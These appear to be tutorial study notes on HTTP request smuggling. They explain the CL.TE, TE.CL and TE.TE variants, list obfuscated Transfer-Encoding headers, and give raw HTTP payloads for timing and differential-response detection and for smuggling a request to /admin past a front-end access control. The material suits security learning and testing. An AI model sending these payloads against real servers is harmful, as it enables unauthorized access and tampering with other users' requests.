## What is HTTP request smuggling?

- technique for interfering with the way a web stie processes sequences of HTTP requests that are received from one or more users
- Request smuggling vulnerabilities are often critical in nature, allowing an attacker to
  - bypass security controls
  - gain unauthorized access to sensitive data, and
  - directly compromise other application users

## What happens in an HTTP request smuggling attack?

- For most of today's web application, users send requests to a front-end server (load balancer or reverse proxy) and this server forwards requests to one or more back-end servers
- it typically sends several requests over the same back-end network connection

![pic1](../images/forwarding-http-requests-to-back-end-server.svg)

- HTTP requests are sent on after another, and the receiving server parses the HTTP request headers to determine where one request ends and the next one begins
- In this situation, it is crucial that the front-end and back-end systems agree about the boundaries between requests
- an attacker might be able to send an ambiguous request that gets interpreted differently by the front-end and back-end systems

![pic2](../images/smuggling-http-request-to-back-end-server.svg)

## How do HTTP request smuggling vulnerabilities arise?

- the HTTP specification provides two different ways to specify where a request ends: the `Content-Length` header and the `Transfer-Encoding` header
- `Content-Length` - specifies the length of the message body in bytes
- `Transfer-Encoding` - specifies that the message body uses chunked encoding; message body contains one or more chunks of data; each chunk consists of the chunk size in bytes (in hexadecimal) followed by a newline, followed by the chunk contents
- since the HTTP specification provides two different methods for specifying the length of HTTP messages, it is possible for a single message to use both methods at once, such that they conflict with each other
- if both headers are present, `Content-Length` should be ignored (only a single server is in play and not for two or more servers are chained together)
- if the front-end and back-end servers behave differently for the `Transfer-Encoding`, then they might disagree about the boundaries between successive requests, leading to request smuggling vulnerabilities

## How to perform an attack?

- placing both the `Content-Length` and `Transfer-Encoding` headers into a single HTTP request and manipulating these so that the front-end and back-end servers process the request differently
- it depends on the behavior of the two servers:
  - **CL.TE** - front-end server uses the `Content-Length` header and the back-end server uses the `Transfer-Encoding` header
  - **TE.CL** - front-end uses `Transfer-Encoding` and back-end uses `Content-Length`
  - **TE.TE** - both front and back-end support `Transfer-Encoding` but one of the servers can be induced not to process it by obfuscating the header in some way

### CL.TE vulnerabilities

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

- Front-end server processes the `Content-Length` header and request body has 13 bytes long, up to the end of SMUGGLED
- Back-end server processes the `Transfer-Encoding` which is chunked and processes the first chunk which is stated to be zero length, and treated as terminating the request
- So, the following bytes, SMUGGLED are left unprocessed and the back-end server will treat these as being the start of next request in the sequence

### TE.CL vulnerabilities

- front-end - `Transfer-Encoding`
- back-end - `Content-Length`

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

- front-end server processes the `Transfer-Encoding` header, and treat the message body as using chunked encoding. It processes the first chunk which is stated as 8 bytes long, up to the end of SMUGGLED and it processes the second chunk, which is stated to be zero length and treated as terminating the request. Then forwarded to the back-end server

- back-end server processes the `Content-Length` header and determines that the request body as 3 bytes long, up to the end of 8. The following bytes, starting with `SMUGGLED` are left unprocessed and the back-end server will treat these as being the start of the next request in the sequence.

### TE.TE behavior: obfuscating the TE header

- both front and back-end support `Transfer-Encoding`
- but one of the servers can be induced not to process it by obfuscating the header
- many ways to obfuscate the `Transfer-Encoding` header
- eg

```
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding: [tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

## How to identify HTTP request smuggling

### Using timing techniques

#### Finding CL.TE vulnerabilities

- if the application is vulnerable to the CL.TE variant of request smuggling, sending a request like the following will often cause a time delay:

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```

- front-end uses `Content-Length`, it will forward only part of this request, omitting X
- back-end uses `Transfer-Encoding`, processes the first chunk, and waits for the next chunk to arrive and will cause an observable time delay

#### Findng TE.CL vulnerabilities

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 6

0

X
```

- front-end uses `Transfer-Encoding`, it will forward only part of this request, omitting the X
- back-end uses `Content-Length`, expect more content in the message body and will cause time delay

### Confirming HTTP request smuggling vulnerabilities using differential responses

- sending two requests to the application in quick succession:

  - attack request that is designed to interfere with the processing of the next request
  - normal request

- if the response to the normal request contains the expected interference, the vulnerability is confirmed.

eg - normal request looks like:

```
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

- This request normally receives an HTTP response with status code 200, containing some search results
- attack request depends on variant of whether CL.TE vs TE.CL

#### Confirming CL.TE

```
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x
```

- if the attack is successful, the last two lines of the request are treated by the back-end server as belonging to the next request that is received and cause the subsequent normal request to look like this

```
GET /404 HTTP/1.1
Foo: xPOST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

- the request contains an invalid URL, the server will response with status code 404

#### Confirming TE.CL

- attack request like this:

```
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

7c
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x=
0


```

- if the attack is successful, everything from `GET /404` onwards is treated by the back-end server as belonging to the next request that is received.

```
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 146

x=
0
```

> attack request and normal request should be sent to the server using different network connection. Sending both from the same connection won't prove that the vulnerability exists
> attack request and normal request should use the same URL and parameter names
> should send the normal request immediately after the attack request

## Exploiting HTTP request smuggling vulnerabilities

### Bypass front-end security controls

- suppose an application uses the front-end server to implement access control restrictions, only forwarding requests if the user is authorized to access the requested URL
- back-end server honors every request without further checking
- suppose current user is permitted to access `/home` but not `/admin`
- this can bypass by using the following smuggling attack

```
POST /home HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 62
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: xGET /home HTTP/1.1
Host: vulnerable-website.com
```
